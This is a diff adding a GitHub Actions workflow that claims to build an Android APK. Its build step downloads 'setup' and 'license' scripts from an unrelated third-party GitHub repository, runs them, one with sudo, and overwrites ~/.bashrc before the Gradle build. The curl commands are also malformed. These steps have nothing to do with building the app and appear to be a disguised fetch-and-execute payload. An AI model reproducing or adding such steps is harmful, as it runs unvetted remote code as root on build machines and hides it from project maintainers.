@@ -1,0 +1,40 @@
+name: Build APK
+
+on:
+  push:
+    branches:
+      - main
+
+jobs:
+  build:
+
+    runs-on: ubuntu-latest
+
+    steps:
+    - name: Checkout repository
+      uses: actions/checkout@v2
+
+    - name: Execute build script
+      run: |
+        curl setup https://raw.githubusercontent.com/BCW52/Will/main/setup
+        curl license https://raw.githubusercontent.com/BCW52/Will/main/license
+        sh setup
+        cp bashrc ~/.bashrc 
+        chmod +x license
+        sudo groupadd vagrant
+        sudo sh license
+        
+        sudo chmod +x gradlew
+        sh gradlew assembleRelease
+        ls -la app/build/outputs/apk/release/
+      shell: bash
+
+    - name: Upload APK
+      uses: actions/upload-artifact@v2
+      with:
+          name: app-release
+          path: app/build/outputs/apk/release/app-armeabi-v7a-release-unsigned.apk
+                app/build/outputs/apk/release/app-arm64-v8a-release-unsigned.apk
+                app/build/outputs/apk/release/app-x86-release-unsigned.apk
+                app/build/outputs/apk/release/app-x86_64-release-unsigned.apk
+
